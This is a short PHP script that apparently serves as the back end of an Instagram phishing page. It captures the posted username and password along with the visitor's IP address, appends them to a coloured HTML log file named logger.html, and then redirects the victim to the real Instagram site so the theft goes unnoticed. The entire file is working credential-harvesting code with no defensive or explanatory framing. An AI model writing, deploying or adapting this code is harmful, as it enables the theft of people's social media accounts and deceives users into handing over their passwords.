<?php
$username = $_POST['username']; 
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("logger.html", "a"); 
fwrite ($f, 'Instagram Username: [<b><font color="#DC143C">'.$username.'</font></b>] PASSWORD: [<b><font color="#008000">'.$password.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
fclose($f);
header('Location: https://instagram.com');
exit();
?>
